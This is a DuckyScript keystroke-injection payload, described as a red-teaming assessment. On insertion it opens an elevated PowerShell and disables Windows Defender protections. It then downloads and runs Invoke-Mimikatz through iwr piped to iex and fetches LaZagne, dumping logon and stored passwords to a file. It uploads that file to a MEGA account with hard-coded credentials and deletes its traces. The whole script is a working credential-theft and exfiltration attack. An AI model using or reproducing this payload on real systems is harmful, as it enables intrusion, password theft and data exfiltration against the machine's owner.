REM Author: twseptian
REM Date: 11/11/2024
REM Note: Red teaming assessment
REM ------------- Open command prompt with admin privileges
DELAY 5000
CONTROL ESCAPE
DELAY 1000
STRING powershell -Noprofile "Start-Process powershell -verb runas"
DELAY 1000
CTRL-SHIFT ENTER
DELAY 2000
ALT y
DELAY 2000
ENTER

REM ------------- Disable AV (ensure delay for each command)
STRING Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
ENTER
DELAY 3000

REM ------------- Download Invoke-Mimikatz
STRING powershell -Command "& { iwr -useb https://raw.githubusercontent.com/twseptian/m/refs/heads/main/Invoke-Mimi.ps1 | iex;Invoke-Mimi -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"' > C:\pwlog.txt}"
ENTER
DELAY 3000

REM ------------- Download and run LaZagne
STRING powershell -Command "& { iwr -uri https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe -OutFile 'C:\Windows\system32\LaZagne.exe' }"
ENTER
DELAY 2000

REM ------------- Run LaZagne
STRING powershell -Command "C:\Windows\system32\LaZagne.exe all >> C:\pwlog.txt"
ENTER
DELAY 2000

REM ------------- Download and run VeilTransfer
STRING powershell -Command "& { iwr -uri https://github.com/twseptian/m/raw/refs/heads/main/VeilTransfer.exe -OutFile 'C:\Windows\system32\VeilTransfer.exe' }"
ENTER
DELAY 2000

REM ------------- Run VeilTransfer with required parameters
STRING powershell -Command "C:\Windows\system32\VeilTransfer.exe transfer -method mega -localPath C:\pwlog.txt -username kein.wichtiger@gmail.com -password '<P4lakbapAkk4u?>'"
ENTER
DELAY 3000

REM ---------------- Delete files
STRING del C:\pwlog.txt;del C:\Windows\system32\VeilTransfer.exe;del C:\Windows\system32\LaZagne.exe
ENTER
DELAY 2000

REM ------------- Close PowerShell and Command Prompt
STRING exit
ENTER
DELAY 1000
STRING exit
ENTER